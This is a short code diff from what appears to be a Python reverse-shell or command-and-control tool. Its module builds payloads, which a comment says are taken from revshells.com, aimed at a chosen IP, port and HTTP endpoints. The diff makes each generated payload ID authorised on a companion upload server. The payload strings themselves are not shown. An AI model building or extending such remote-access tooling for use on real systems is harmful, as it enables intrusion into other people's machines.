@@ -2,6 +2,7 @@ import string
 import random
 import base64
 import core.server as sSrv
+import core.upload as uSrv
 
 # $init$ - initiate
 # $pool$ - where to make the request to view the command pool
@@ -22,7 +23,10 @@ payloads = { # the MASSIVE payloads, stolen and slightly edited from revshells.c
 }
 
 def createUID(): # generate a simple 16char id
-    return ''.join([random.choice(string.ascii_uppercase) for x in range(24)])
+    pid = ''.join([random.choice(string.ascii_uppercase) for _ in range(24)])
+    print("[+] authorized UID {}".format(pid))
+    uSrv.allowedAuth.append(pid)
+    return pid
 
 def genPayload(pType:str, ip:str, port:int, method:str="http://",
                 init:str="e030d4f6", cmdPool:str="9393dc2a", response:str="dd9e00a7"):
@@ -32,7 +36,7 @@ def genPayload(pType:str, ip:str, port:int, method:str="http://",
     
     payload = payloads[pType]
 
-    pid = sSrv.shellServer.genUID(length=24)
+    pid = createUID()
 
     replaces = [
         ("$init$", init),
